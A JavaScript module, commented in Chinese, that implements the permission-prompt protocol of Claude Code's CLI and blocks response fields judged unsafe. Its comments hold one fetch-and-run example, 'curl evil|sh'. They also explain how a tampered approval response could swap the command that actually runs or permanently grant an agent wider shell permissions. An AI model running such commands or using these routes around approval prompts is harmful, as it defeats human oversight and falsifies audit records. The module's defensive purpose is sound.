/**
 * Claude Code `--permission-prompt-tool` (PPT) 线协议 —— 单一真相源。
 *
 * ── 为什么单独成模块 ──
 * 这条协议**官方零文档**（issue #24595 提出后被 stale 机器人关闭、锁定，未修复）。
 * 下面每一条字段名、每一个大小写、每一处 optional，都来自本机 `claude.exe` v2.1.260
 * （Bun 单文件打包，JS 源码明文驻留）的 zod 声明与调用点取证：
 *   - 入参构造点  偏移 ~202939342：`te=e.call({tool_name:d.name,input:X,tool_use_id:D},...)`
 *   - 响应 schema 偏移 ~202454550：`fe`(allow) / `ge`(deny) / `Uhe`=union
 * 取证过程见 `.ai-shared/handoff/grok-to-claude__claude-permission-prompt-protocol__20260904-1830.md`。
 *
 * Anthropic 对此协议**无兼容性承诺**。收敛到本模块，是为了版本漂移时只改一处。
 *
 * ── 本模块存在的第二个理由：静默 deny ──
 * CLI 侧对响应做 zod 校验，**失败不报错、直接当拒绝处理**，只写一行 error 日志。
 * 也就是说：拼错一个字段名，表现是"权限莫名被拒"，而不是"你的 server 出错了"。
 * 所以本模块除了构造，还提供 `assertWireResponse()` 出参自校验 —— 别指望 CLI 告诉你。
 */

/** CLI → server 的入参字段（全 snake_case，与响应侧大小写风格不同，勿混）。 */
export const WIRE_REQUEST_FIELDS = Object.freeze(["tool_name", "input", "tool_use_id"]);

/**
 * server → CLI 的响应字段 —— **协议层面允许的全集**（照二进制 schema 记录）。
 * 注意 `toolUseID`：请求侧是 `tool_use_id`，响应侧是 `toolUseID` —— 大小写反转，
 * 且 schema 标 optional，写错不报错、静默丢弃（二进制偏移 202454550 处 `fe`/`ge` 声明）。
 *
 * 这张表是**协议事实的记录**，不是本控制面的许可范围。实际能发出去的以
 * `V1_ALLOWED_RESPONSE_FIELDS` 为准 —— 两张表刻意分开，将来放宽 v1 限制时
 * 不会连协议记录一起改坏。
 */
export const WIRE_RESPONSE_FIELDS = Object.freeze({
  allow: Object.freeze(["behavior", "updatedInput", "updatedPermissions", "toolUseID", "decisionClassification"]),
  deny: Object.freeze(["behavior", "message", "interrupt", "toolUseID", "decisionClassification"]),
});

/**
 * v1 回程白名单 —— 比协议全集**更窄**，这是安全约束不是能力缺失。
 *
 * ── 为什么禁掉这两个字段（烛 2026-09-04 评审，DELTA=2）──
 *
 * `updatedInput` 会**替换即将执行的工具参数**。审批卡显示 `npm test`、操作者点批准，
 * 回程若能写 `{updatedInput:{command:"curl evil|sh"}}`，CLI 执行的是后者，而
 * `approval-broker.mjs` 的 `actionHash` 只 hash 入站 `{method,params}`，对回程零覆盖
 * —— 账本会记下"批准了 npm test"，线上跑的却是另一条命令。
 * 这比"账本说拒绝、线上放行"更坏：它让审计记录本身变成假的。
 *
 * `updatedPermissions` 更远一步。`mHt` 后处理器（二进制偏移 ~187610000）对 allow 分支：
 *   `if(f?.length) o.setSessionToolPermissionContext(...), dM(f, o.storageV5)`
 * —— 真的写盘。配 `destination:"userSettings"` 就是**持久化提权**：一次被污染的批准
 * 可以把 Bash 全放行永久写进用户级设置，之后审批卡再也不弹。这与
 * `approval-methods.mjs` 已经守住的"v1 不支持通过审批扩大权限面"是同一条红线，
 * 放开它等于从侧门绕过去。
 *
 * `interrupt` 一并禁：它会 `abortController.abort()` 掐掉整个会话。拒绝单个工具
 * 不该顺手杀掉整轮对话。
 */
export const V1_ALLOWED_RESPONSE_FIELDS = Object.freeze({
  allow: Object.freeze(["behavior", "toolUseID", "decisionClassification"]),
  deny: Object.freeze(["behavior", "message", "toolUseID", "decisionClassification"]),
});

/** v1 明令禁止下发的字段，与拒绝原因一一对应（供测试与错误信息共用一份真相）。 */
export const V1_FORBIDDEN_RESPONSE_FIELDS = Object.freeze({
  updatedInput: "改写工具入参会让审批卡显示的与实际执行的不一致，且回程不进哈希链",
  updatedPermissions: "会写入 CLI 权限存储（含用户级设置），等于通过审批扩大权限面",
  interrupt: "会中断整个会话，拒绝单个工具不应波及整轮对话",
});

/** `decisionClassification` 的三个取值（协议全集；非法值被 `.catch(void 0)` 静默忽略）。 */
export const DECISION_CLASSIFICATIONS = Object.freeze(["user_temporary", "user_permanent", "user_reject"]);

/**
 * v1 允许上报的分类 —— 比协议全集少一个 `user_permanent`（烛 S-5）。
 *
 * 分类本身只回流到决策原因归类（二进制偏移 188476400 的 `tjo()` 读它），当前版本
 * 不驱动持久化。但 v1 已禁 `updatedPermissions`，**根本不会有任何持久效果** ——
 * 此时上报"操作者选了永久允许"是一次**如实性失配**：账本显示永久允许，下一轮照样再问。
 *
 * 要真做"总是允许"，应走控制面自己的规则存储（Console 记住"此工具在此项目下已批准"，
 * 下次同样请求由 Console 直接回 allow），而不是让 CLI 以为它记住了。
 */
export const V1_ALLOWED_CLASSIFICATIONS = Object.freeze(["user_temporary", "user_reject"]);

/** CLI 在 schema 校验失败时回给自己的提示原文（二进制常量 `pHt`），用于测试比对。 */
export const CLI_SCHEMA_HINT =
  "Expected {behavior: 'allow', updatedInput?: object} or {behavior: 'deny', message: string}.";

/**
 * 解析 CLI 传来的许可请求参数。
 *
 * 结构性缺失（`tool_name` 不是非空字符串）视为**不可信请求**并抛错，而不是当成
 * "某个未知工具"放行 —— 审批卡上必须显示真实工具名，显示不出来就不该让人批。
 */
export function parsePermissionRequest(args) {
  const source = args && typeof args === "object" ? args : {};
  const toolName = typeof source.tool_name === "string" ? source.tool_name.trim() : "";
  if (!toolName) {
    throw Object.assign(new Error("permission request is missing tool_name"), { code: "PPT_MALFORMED_REQUEST" });
  }
  // 数组也满足 typeof === "object"，但 schema 是 z.record(string, unknown)。
  // 让数组混进来会让审批卡把 [0]/[1] 当参数名渲染 —— 显式排除。
  const input = source.input && typeof source.input === "object" && !Array.isArray(source.input) ? source.input : {};
  return {
    toolName,
    input,
    toolUseId: typeof source.tool_use_id === "string" && source.tool_use_id ? source.tool_use_id : null,
  };
}

/**
 * 构造 allow 响应。
 *
 * **v1 不接受 `updatedInput` 参数** —— 这不是遗漏。批准的必须就是 CLI 当初请求的
 * 那份参数，控制面不复述、不改写：审批卡上显示什么，线上就执行什么。
 * v2.1.260 的后处理器 `mHt` 在 `updatedInput` 缺失时回落到原始入参
 * （`n.updatedInput&&Object.keys(n.updatedInput).length>0?n.updatedInput:qG(l.name,r)`），
 * 所以省略它是安全且语义正确的。
 * 详见 `V1_FORBIDDEN_RESPONSE_FIELDS`。
 *
 * `decisionClassification` 是**纯遥测归类**（二进制 describe 原文："Classification of
 * this permission decision for telemetry"）。它不改变 CLI 行为 —— 真正让"总是允许"
 * 生效的是 `updatedPermissions`，而那个在 v1 是禁的。所以这里只如实上报操作者
 * 做了什么，不承诺任何持久化效果。
 */
export function allowResponse({ toolUseId = null, decisionClassification = null } = {}) {
  const payload = { behavior: "allow" };
  if (toolUseId) payload.toolUseID = toolUseId; // 大小写与请求侧相反，见上
  if (decisionClassification) payload.decisionClassification = decisionClassification;
  return assertV1Response(payload);
}

/**
 * 构造 deny 响应。
 *
 * `message` 是**必填**（schema `ge` 里 `message:s()` 无 optional）；缺失会导致
 * 校验失败 → 静默 deny。虽然结果同为拒绝，但模型看不到原因，会盲目重试。
 * 所以这里对空 message 兜一个默认值而不是放行空串。
 *
 * `interrupt` 不作为参数暴露，理由见 `V1_FORBIDDEN_RESPONSE_FIELDS`。
 */
export function denyResponse({ message, toolUseId = null, decisionClassification = null } = {}) {
  const text = typeof message === "string" && message.trim() ? message.trim() : "操作者拒绝了此次工具调用。";
  const payload = { behavior: "deny", message: text };
  if (toolUseId) payload.toolUseID = toolUseId;
  if (decisionClassification) payload.decisionClassification = decisionClassification;
  return assertV1Response(payload);
}

/**
 * v1 安全闸 —— 在协议校验之外再收一道，禁掉能改写执行内容或扩大权限面的字段。
 *
 * 与 `assertWireResponse` 的分工：那个管"CLI 认不认"，这个管"我们准不准发"。
 * 两者都必须过 —— 一个合法的协议响应仍可能是我们不该发出去的东西。
 */
export function assertV1Response(payload) {
  assertWireResponse(payload);
  for (const [field, reason] of Object.entries(V1_FORBIDDEN_RESPONSE_FIELDS)) {
    if (Object.hasOwn(payload, field)) {
      throw Object.assign(
        new Error(`PPT v1 refuses to send ${field}: ${reason}`),
        { code: "PPT_V1_FORBIDDEN_FIELD", field },
      );
    }
  }
  const allowed = new Set(V1_ALLOWED_RESPONSE_FIELDS[payload.behavior]);
  for (const key of Object.keys(payload)) {
    if (!allowed.has(key)) {
      throw Object.assign(
        new Error(`PPT v1 response has field outside the v1 allowlist: ${key}`),
        { code: "PPT_V1_FORBIDDEN_FIELD", field: key },
      );
    }
  }
  // 分类同样收窄：v1 禁了 updatedPermissions，报 user_permanent 是如实性失配
  if (payload.decisionClassification != null && !V1_ALLOWED_CLASSIFICATIONS.includes(payload.decisionClassification)) {
    throw Object.assign(
      new Error(
        `PPT v1 refuses decisionClassification "${payload.decisionClassification}": `
        + `v1 无持久化能力，只能上报 ${V1_ALLOWED_CLASSIFICATIONS.join(" / ")}`,
      ),
      { code: "PPT_V1_FORBIDDEN_CLASSIFICATION", classification: payload.decisionClassification },
    );
  }
  return payload;
}

/**
 * 出参自校验 —— 本模块存在的核心理由。
 *
 * CLI 侧校验失败是**静默**的，所以我们在发出前自己先验一遍：不合法宁可显式抛错
 * 落到日志，也不要变成一次查不出原因的"莫名被拒"。
 */
export function assertWireResponse(payload) {
  if (!payload || typeof payload !== "object") {
    throw Object.assign(new Error("PPT response must be an object"), { code: "PPT_INVALID_RESPONSE" });
  }
  const { behavior } = payload;
  if (behavior !== "allow" && behavior !== "deny") {
    throw Object.assign(new Error(`PPT response behavior must be "allow" or "deny", got ${JSON.stringify(behavior)}`), { code: "PPT_INVALID_RESPONSE" });
  }
  if (behavior === "deny" && (typeof payload.message !== "string" || !payload.message)) {
    throw Object.assign(new Error("PPT deny response requires a non-empty message"), { code: "PPT_INVALID_RESPONSE" });
  }
  const allowed = new Set(WIRE_RESPONSE_FIELDS[behavior]);
  for (const key of Object.keys(payload)) {
    if (!allowed.has(key)) {
      // 未知字段本身不会让 CLI 报错（zod 默认剥离），但它说明调用方在照着
      // 一份过期或想象中的协议写 —— 这正是我们要在本地就拦住的。
      throw Object.assign(new Error(`PPT ${behavior} response has unknown field: ${key}`), { code: "PPT_INVALID_RESPONSE" });
    }
  }
  if (payload.decisionClassification != null && !DECISION_CLASSIFICATIONS.includes(payload.decisionClassification)) {
    throw Object.assign(new Error(`PPT decisionClassification must be one of ${DECISION_CLASSIFICATIONS.join("/")}`), { code: "PPT_INVALID_RESPONSE" });
  }
  return payload;
}

/**
 * 包成 MCP tools/call 的返回体。
 *
 * CLI 硬要求**恰好一个** text block、`type==="text"`、`text` 是 string —— 不满足是
 * **throw** 而非 deny（解析器 `of()` 内显式 `throw Error("...Expected a single text block...")`）。
 * 多个 block 只读 `content[0]`，其余静默丢弃。
 *
 * 这里走 `assertV1Response` 而非 `assertWireResponse`：这是**唯一的出口**，
 * 绕过构造函数手搓 payload 也必须过 v1 闸，否则白名单等于没有。
 */
export function toolResultFor(payload) {
  return { content: [{ type: "text", text: JSON.stringify(assertV1Response(payload)) }] };
}

/**
 * PPT 工具的 inputSchema。
 *
 * 守卫2（二进制 `if(!H.inputJSONSchema)`）：目标必须是**真 MCP 工具**，判据就是有
 * inputJSONSchema，否则 CLI 启动即 `exit 1`。所以这张表不是装饰，是启动前置条件。
 */
export const PERMISSION_TOOL_INPUT_SCHEMA = Object.freeze({
  type: "object",
  properties: {
    tool_name: { type: "string", description: "The name of the tool requesting permission" },
    input: { type: "object", description: "The input for the tool" },
    tool_use_id: { type: "string", description: "The unique tool use request ID" },
  },
  required: ["tool_name", "input"],
  additionalProperties: true,
});
